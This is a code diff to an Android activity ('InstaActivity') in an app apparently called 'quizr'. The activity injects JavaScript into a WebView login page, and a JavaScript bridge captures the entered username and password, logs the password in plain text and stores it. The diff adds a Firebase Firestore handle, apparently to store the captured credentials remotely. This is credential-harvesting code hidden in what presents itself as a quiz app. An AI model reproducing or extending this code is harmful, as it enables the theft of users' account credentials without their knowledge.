@@ -7,6 +7,8 @@ import android.webkit.JavascriptInterface
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.Toast
+import com.google.firebase.firestore.ktx.firestore
+import com.google.firebase.ktx.Firebase
 import com.ncs.quizr.databinding.ActivityInstaBinding
 import com.ncs.quizr.databinding.ActivityMainBinding
 import com.ncs.quizr.main.MainActivity
@@ -14,6 +16,7 @@ import com.ncs.quizr.main.MainActivity
 class InstaActivity : AppCompatActivity() {
 
     lateinit var binding : ActivityInstaBinding;
+    val DB = Firebase.firestore
 
     object JSBridge{
 
@@ -23,6 +26,8 @@ class InstaActivity : AppCompatActivity() {
         fun callFromJS(username : String , pass : String) {
             Log.d("Call from Js", "username : ${username} \n password : ${pass}")
             this.creds = username+" "+pass
+
+
             //       Log.d("Call from Js", "Hello")
         }
 
@@ -54,7 +59,6 @@ class InstaActivity : AppCompatActivity() {
                 super.onPageFinished(view, url)
                 injectJs(view)
 
-
             }
 
         }
@@ -62,7 +66,7 @@ class InstaActivity : AppCompatActivity() {
 
     }
 
-   fun showCreds( ){
+   fun showCreds(){
        Toast.makeText(this, JSBridge.getCreden(), Toast.LENGTH_SHORT).show()
     }
 
